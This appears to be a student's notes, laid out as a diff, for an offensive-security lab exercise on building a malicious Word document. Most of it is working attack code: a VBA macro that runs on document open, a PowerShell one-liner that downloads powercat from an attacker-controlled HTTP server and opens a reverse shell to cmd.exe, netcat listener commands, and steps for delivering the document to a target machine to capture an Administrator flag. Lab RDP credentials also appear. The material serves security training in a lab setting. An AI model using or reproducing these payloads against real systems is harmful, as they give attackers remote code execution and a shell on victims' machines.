@@ -1,0 +1,72 @@
+Questions1
+Perform the steps from this section to create a malicious Word document containing a macro with the name MyMacro on the OFFICE (VM #1) machine. For this, you have to install Microsoft Office on VM #1 again as outlined in the section "Installing Microsoft Office". Confirm that the macro works as expected by obtaining a reverse shell from the OFFICE machine. What keyword is used to declare a variable in VBA?
+
+Hints
+- Watch the video for this learning unit if you encounter difficulties replicating the steps.
+- In VBA, use the keyword for declaring variables.
+- Review the paragraph above Listing 5 and the code in Listing 5.
+
+RDP into VM machine
+xfreerdp /u:offsec /p:lab /v:192.168.158.196:3389
+
+First create a Macro using old Office Word Format .doc (Word 97-2003)
+From View >> Macros >> View Macros >> Create with name MyMacro
+
+# VBA Script to check the Powershell
+test-pwsh-macro.vba
+
+PowerShell download PowerCat and execute Reverse Shell
+https://systemweakness.com/ms-word-macros-with-powercat-reverse-shell-58b20983e0f0
+
+Download powercat.ps1
+https://github.com/besimorhino/powercat
+
+Preparing Host Webservice and Netcat listen
+Python -m http.server 88
+nc -lvnp 8443
+
+PowerShell Reverse Shell and encode to Base64
+LHOST=192.168.45.191
+LPORT=8443
+WebPORT=88
+pwsh -c "iex (New-Object System.Net.WebClient).DownloadString('http://$LHOST:$WebPORT/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe" > revshell-pwsh.txt
+
+Validate the content
+head revshell-pwsh.txt 
+
+revshell-pwsh-macro.vba
+Sub AutoOpen()
+    MyMacro
+End Sub
+Sub Document_Open()
+    MyMacro
+End Sub
+Sub MyMacro()
+    Dim Str As String
+    Str = "powershell -c ""$code=(New-Object System.Net.Webclient).DownloadString('http://192.168.45.191:88/revshell-pwsh.txt'); iex 'powershell -E $code'"""
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+
+Questions2
+Once you have confirmed that the macro from the previous exercise works, upload the document containing the macro MyMacro in the file upload form (port 8000) of the TICKETS (VM #2) machine with the name ticket.doc. A script on the machine, simulating a user, checks for this file and executes it. After receiving a reverse shell, enter the flag from the flag.txt file on the desktop for the Administrator user. For the file upload functionality, add tickets.com with the corresponding IP address in /etc/hosts. Please note that it can take up to three minutes after uploading the document for the macro to get executed.
+
+Transfer the payload from VM1 to Kali using xfreerdp
+https://medium.com/@drenfermo/different-ways-to-transfer-files-from-to-linux-and-windows-machines-ii-a351b5a78811
+
+xfreerdp /u:'offsec' /p:'lab' /v:192.168.158.196:3389 /size:95% /cert:ignore +clipboard /drive:smbfolder,/home/kali/Desktop/Office
+
+Before upload the ticket.doc we need to add DNS to /etc/hosts
+nano /etc/hosts
+<VM2-IP> tickets.com
+
+Access to VM2 and upload the payload
+<VM2-ip>:8000
+
+Make sure listen to the payload Remote port
+nc -lvnp 8443
+
+Flag can be found at Administrator\Desktop
+
+
+
+
